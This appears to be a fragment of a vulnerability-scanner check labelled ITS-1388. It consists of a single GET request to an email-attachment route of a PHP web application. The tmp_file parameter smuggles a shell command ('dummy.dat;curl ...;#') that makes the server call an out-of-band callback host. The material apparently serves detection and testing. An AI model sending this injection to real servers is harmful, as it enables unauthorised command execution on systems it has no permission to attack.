# Vulnerable: ITS-1388
GET /index.php?r=email/message/tnefAttachmentFromTempFile&tmp_file=dummy.dat;curl+{{interactsh-url}};%23&security_token={{security_token}}
